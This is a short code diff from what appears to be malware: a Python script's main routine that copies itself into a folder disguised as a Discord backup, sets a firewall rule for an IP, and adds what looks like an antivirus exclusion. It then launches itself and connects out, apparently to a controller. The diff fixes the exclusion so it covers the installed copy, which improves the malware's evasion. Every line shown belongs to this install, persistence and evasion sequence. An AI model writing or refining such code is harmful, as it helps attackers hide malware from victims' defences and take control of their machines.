@@ -130,6 +130,6 @@ if __name__ == "__main__":
     destin = r"%userprofile%\appdata\local\discordbak"
     installed_path = copy(destin)
     firewall("UpdateRule", installed_path, ip)
-    exclude(filepath)
+    exclude(installed_path)
     start(installed_path)
     connect()
